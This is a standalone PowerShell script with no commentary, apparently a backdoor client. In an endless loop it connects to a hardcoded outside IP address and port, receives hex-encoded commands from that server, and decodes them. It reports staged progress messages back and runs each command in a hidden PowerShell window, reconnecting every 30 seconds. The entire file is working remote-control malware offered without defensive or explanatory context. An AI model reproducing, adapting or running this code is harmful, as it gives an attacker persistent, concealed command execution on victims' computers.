while ($true) {
$Client = New-Object System.Net.Sockets.TcpClient("66.228.37.7", 1211)
$Stream = $Client.GetStream()
$Writer = New-Object System.IO.StreamWriter($Stream)
# Receive the message from the server as plain text
$StreamReader = New-Object System.IO.StreamReader($Stream, [System.Text.Encoding]::ASCII)
$msg = $StreamReader.ReadLine()
$array = ""
$bytes = $msg -split "\\" | Where-Object { $_ -ne "" }
if ($bytes.Count -eq 0) {
    ""
} else {
    for ($i = 0; $i -lt $bytes.Count; $i++) {
        $byte = "0" + $bytes[$i]
        if ($i -lt $bytes.Count - 1) {
            $array += $byte + ", "
        } else {
            $array += $byte
        }
    }
}
$bytes = $array.Replace("0x", "").Split(",")
$byteArray = New-Object Byte[] $bytes.Count
for ($i = 0; $i -lt $bytes.Count; $i++) {
    $byteArray[$i] = [byte]::Parse($bytes[$i], [System.Globalization.NumberStyles]::HexNumber)
}
$shellcode = [System.Text.Encoding]::Unicode.GetString($byteArray)
sleep 3
$Writer.WriteLine("Payload sent to remote system")
$Writer.Flush()
sleep 1
$Writer.WriteLine("------------------------------------------------------------")
$Writer.Flush()
sleep 1
$Writer.WriteLine("See payload in plaintext below:")
$Writer.Flush()
sleep 1
$Writer.WriteLine("------------------------------------------------------------")
$Writer.Flush()
sleep 1
$Writer.WriteLine("[+]")
$Writer.Flush()
sleep 0.4
$Writer.WriteLine("[+]")
$Writer.Flush()
sleep 0.4
$Writer.WriteLine("[+]")
$Writer.Flush()
sleep 0.4
$Writer.WriteLine($shellcode)
$Writer.Flush()
sleep 1
$Writer.WriteLine("[+]")
$Writer.Flush()
sleep 0.4
$Writer.WriteLine("[+]")
$Writer.Flush()
sleep 0.4
$Writer.WriteLine("[+]")
$Writer.Flush()
sleep 0.4
$Writer.WriteLine("Executing Command...")
$Writer.Flush()
sleep 1
iEx "start powershell -windowstyle hidden -Args '$shellcode'"
# Close the connection
$StreamReader.Close()
$Stream.Close()
$Client.Close()
Start-Sleep -Seconds 30
}
